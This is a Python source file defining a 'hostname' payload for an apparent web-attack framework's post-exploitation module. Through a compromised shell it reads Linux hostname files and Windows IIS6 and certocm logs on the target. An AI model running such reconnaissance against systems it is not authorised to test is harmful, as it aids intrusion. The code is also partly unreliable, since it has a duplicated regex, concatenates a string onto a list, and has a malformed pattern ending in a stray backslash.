import re
from plugins.attack.payloads.base_payload import base_payload

class hostname(base_payload):
    '''
    This payload shows the server hostname
    '''
    def api_read(self):
        result = {}
        result['Hostname'] = []
        
        values = []
        values.append(self.shell.read('/etc/hostname')[:-1])
        values.append(self.shell.read('/proc/sys/kernel/hostname')[:-1])
        
        values = list(set(values))
        values= [p for p in values if p != '']
        
        result['Hostname'] = values
        
        return result
    
    def api_win_read(self):
        result = {}
        result['Hostname'] = []
        def parse_iis6_log(iis6_log):
            root1 = re.findall('(?<=OC_COMPLETE_INSTALLATION:m_csMachineName=)(.*?) ', iis6_log, re.MULTILINE)
            root2 = re.findall('(?<=OC_QUEUE_FILE_OPS:m_csMachineName=)(.*?) ',  iis6_log, re.MULTILINE)
            root3 = re.findall('(?<=OC_COMPLETE_INSTALLATION:m_csMachineName=)(.*?) ',  iis6_log, re.MULTILINE)
            root = root1+root2+root3
            if root:
                return root
            else:
                return []
        
        def parse_certocm_log(certocm_log):
            hostname = re.search('(?<=Set Directory Security:\\)(.*?)\\', certocm_log)
            if hostname:
                return '\\'+hostname.group(0)
            else:
                return ''
             
            
        hostnames = parse_iis6_log(self.shell.read('/windows/iis6.log'))
        hostnames+=parse_certocm_log(self.shell.read('/windows/certocm.log'))
        hostnames = list(set(hostnames))
        hostnames= [p for p in hostnames if p != '']
        result['Hostname'] = hostnames
        return result

    def run_read(self):
        hashmap = self.api_read()
        result = []
        for hostname in hashmap['Hostname']:
            result.append(hostname)
        
        if result == []:
            result.append('Hostname not found.')
        return result
        
